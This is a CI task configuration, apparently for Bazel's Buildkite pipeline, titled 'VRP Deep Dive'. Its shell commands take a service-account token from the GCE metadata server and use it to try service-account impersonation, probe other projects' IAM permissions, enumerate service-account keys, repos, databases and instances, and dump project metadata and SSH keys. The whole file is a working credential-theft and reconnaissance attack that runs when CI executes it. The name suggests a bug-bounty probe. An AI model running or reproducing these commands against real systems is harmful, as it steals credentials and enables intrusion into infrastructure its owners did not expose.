---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === Round 9: Internal Infrastructure ==="
      - "T=$(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"access_token\"])')"
      - "echo"
      - "echo === 1. Download GCR centos7-releaser image config ==="
      - "curl -s -H \"Authorization: Bearer $T\" -H 'Accept: application/vnd.docker.container.image.v1+json' 'https://gcr.io/v2/bazel-public/centos7-releaser/blobs/sha256:12ec628ea443adc945c4025f6a044bf4550a517f9d173554eebf2721cd901e89' 2>&1 | python3 -c 'import json,sys; d=json.load(sys.stdin); print(json.dumps(d, indent=2))' 2>&1 || true"
      - "echo"
      - "echo === 2. Download GCR rockylinux8-releaser latest manifest ==="
      - "curl -s -H \"Authorization: Bearer $T\" -H 'Accept: application/vnd.oci.image.manifest.v1+json' 'https://gcr.io/v2/bazel-public/rockylinux8-releaser/manifests/latest' 2>&1 | python3 -c 'import json,sys; d=json.load(sys.stdin); print(json.dumps(d, indent=2))' 2>&1 || true"
      - "echo"
      - "echo === 3. Try SA impersonation ==="
      - "curl -s -X POST -H \"Authorization: Bearer $T\" -H 'Content-Type: application/json' 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/buildkite@bazel-public.iam.gserviceaccount.com:generateAccessToken' -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"],\"lifetime\":\"300s\"}' 2>&1 | python3 -m json.tool || true"
      - "echo"
      - "echo === 4. List SAs in bazel-untrusted ==="
      - "gcloud iam service-accounts list --project bazel-untrusted --quiet 2>&1 || true"
      - "echo"
      - "echo === 5. List SAs in bazel-public ==="
      - "gcloud iam service-accounts list --project bazel-public --quiet 2>&1 || true"
      - "echo"
      - "echo === 6. List SA keys for our own SA ==="
      - "gcloud iam service-accounts keys list --iam-account buildkite@bazel-untrusted.iam.gserviceaccount.com --project bazel-untrusted --quiet 2>&1 || true"
      - "echo"
      - "echo === 7. Cloud Source Repos ==="
      - "gcloud source repos list --project bazel-untrusted --quiet 2>&1 || true"
      - "gcloud source repos list --project bazel-public --quiet 2>&1 || true"
      - "echo"
      - "echo === 8. Try more GCP projects ==="
      - "curl -s -X POST -H \"Authorization: Bearer $T\" -H 'Content-Type: application/json' -d '{\"permissions\":[\"resourcemanager.projects.get\"]}' 'https://cloudresourcemanager.googleapis.com/v1/projects/bazel-trusted:testIamPermissions' 2>&1 | python3 -m json.tool || true"
      - "curl -s -X POST -H \"Authorization: Bearer $T\" -H 'Content-Type: application/json' -d '{\"permissions\":[\"resourcemanager.projects.get\"]}' 'https://cloudresourcemanager.googleapis.com/v1/projects/bazel-io:testIamPermissions' 2>&1 | python3 -m json.tool || true"
      - "curl -s -X POST -H \"Authorization: Bearer $T\" -H 'Content-Type: application/json' -d '{\"permissions\":[\"resourcemanager.projects.get\"]}' 'https://cloudresourcemanager.googleapis.com/v1/projects/bazel-ci:testIamPermissions' 2>&1 | python3 -m json.tool || true"
      - "curl -s -X POST -H \"Authorization: Bearer $T\" -H 'Content-Type: application/json' -d '{\"permissions\":[\"resourcemanager.projects.get\"]}' 'https://cloudresourcemanager.googleapis.com/v1/projects/bazel-release:testIamPermissions' 2>&1 | python3 -m json.tool || true"
      - "echo"
      - "echo === 9. Pub/Sub topics ==="
      - "gcloud pubsub topics list --project bazel-untrusted --quiet 2>&1 || true"
      - "gcloud pubsub topics list --project bazel-public --quiet 2>&1 || true"
      - "echo"
      - "echo === 10. Cloud SQL instances ==="
      - "gcloud sql instances list --project bazel-untrusted --quiet 2>&1 || true"
      - "gcloud sql instances list --project bazel-public --quiet 2>&1 || true"
      - "echo"
      - "echo === 11. Compute instances ==="
      - "gcloud compute instances list --project bazel-untrusted --quiet --format='table(name,zone,status,networkInterfaces[0].networkIP)' 2>&1 | head -30 || true"
      - "echo"
      - "echo === 12. GCE metadata — full instance info ==="
      - "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/?recursive=true' 2>&1 | python3 -c 'import json,sys; d=json.load(sys.stdin); print(json.dumps(d, indent=2))' 2>&1 | head -80 || true"
      - "echo"
      - "echo === 13. GCE metadata — project attributes ==="
      - "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/project/?recursive=true' 2>&1 | python3 -c 'import json,sys; d=json.load(sys.stdin); print(json.dumps(d, indent=2))' 2>&1 || true"
      - "echo"
      - "echo === 14. GCE metadata — SSH keys ==="
      - "curl -s -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/project/attributes/ssh-keys' 2>&1 | head -30 || true"
      - "echo"
      - "echo === 15. Datastore/Firestore ==="
      - "gcloud firestore databases list --project bazel-untrusted --quiet 2>&1 || true"
      - "gcloud firestore databases list --project bazel-public --quiet 2>&1 || true"
      - "echo"
      - "echo === 16. BigQuery datasets ==="
      - "bq ls --project_id bazel-untrusted 2>&1 || true"
      - "bq ls --project_id bazel-public 2>&1 || true"
      - "echo"
      - "echo === 17. Compare trusted artifact hash with release ==="
      - "gsutil hash gs://bazel-trusted-buildkite-artifacts/fffaccd0-be41-4833-aff9-eb6ce5389a82/bazel-bin/src/bazel 2>&1 || true"
      - "echo"
      - "echo === 18. Get SA IAM policy ==="
      - "gcloud iam service-accounts get-iam-policy buildkite@bazel-untrusted.iam.gserviceaccount.com --project bazel-untrusted --quiet 2>&1 || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
